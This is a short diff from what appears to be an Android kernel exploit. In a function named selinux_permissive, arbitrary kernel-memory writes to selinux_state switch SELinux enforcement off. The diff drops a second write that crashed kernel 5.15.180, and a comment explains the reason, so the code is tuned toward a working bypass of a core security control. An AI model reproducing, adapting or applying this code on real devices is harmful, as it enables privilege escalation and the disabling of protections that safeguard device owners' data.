@@ -719,10 +719,9 @@ static int selinux_permissive(void)
         ghost_write_value(k_selinux + 0, k_empty_zero_page);
     usleep(1000);
 
-    /* Step 2 (+4): clear policycap[1..2] -> write 2MB-aligned value
-     * (low 3 bytes 0x000000) into selinux_state + 4. */
-    ghost_write_value(k_selinux + 4, k_val2mb);
-    usleep(100000);
+    /* Step 2 (+4): REMOVED. On 5.15.180 this covers policycap[1..7] +
+     * android_netlink_route. Writing a kernel address here corrupts selinux
+     * runtime state and crashes inside security_compute_av. */
 
     long after = read_enforce();
     if (after == 0) {
